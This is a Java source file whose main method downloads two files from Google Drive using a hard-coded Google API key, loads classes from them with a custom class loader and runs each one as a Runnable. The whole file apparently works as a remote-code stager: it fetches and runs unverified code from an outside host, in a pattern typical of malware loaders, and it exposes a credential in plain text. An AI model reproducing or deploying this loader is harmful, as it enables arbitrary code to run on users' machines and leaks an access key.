import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;

public class MainClass {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        CustomClassLoader classLoader = new CustomClassLoader(
                new URL[]{new URL("https://www.googleapis.com/drive/v3/files/1Hda8Kn9m96LBiNDUvBP7gTmrLustg70H?alt=media&key=AIzaSyCnyt2lgtvTEVvITi-mD7v0s49OaxLcEog"),
                new URL("https://www.googleapis.com/drive/v3/files/1wG0bcva7AcA2v2TUEADYJFWCgSyL7KzN?alt=media&key=AIzaSyCnyt2lgtvTEVvITi-mD7v0s49OaxLcEog")});
        for (StringBuilder className : classLoader.className) {
            Class<?> clazz = classLoader.findClass(className.toString());
            Runnable runnable = (Runnable) clazz.getDeclaredConstructor().newInstance();
            runnable.run();
        }
    }
}
